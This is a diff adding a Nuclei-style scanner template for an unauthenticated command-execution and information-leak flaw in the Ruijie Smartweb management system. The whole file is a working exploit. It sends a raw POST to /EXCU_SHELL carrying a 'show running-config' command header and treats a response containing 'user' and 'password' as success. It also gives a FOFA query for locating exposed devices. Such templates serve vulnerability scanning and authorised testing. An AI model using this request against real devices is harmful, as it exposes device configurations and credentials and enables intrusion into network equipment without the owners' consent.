@@ -1,0 +1,35 @@
+id: RuiJie_Smartweb-EXCU_SHELL-InformationLeakage
+
+info:
+  name: 锐捷Smartweb管理系统EXCU_SHELL信息泄露漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: server="GoAheadWebs"
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /EXCU_SHELL HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Host: {{Hostname}}
+        Command1: show running-config
+        Confirm1: n
+
+        test
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - user
+          - password
+      - type: status
+        status:
+          - 200
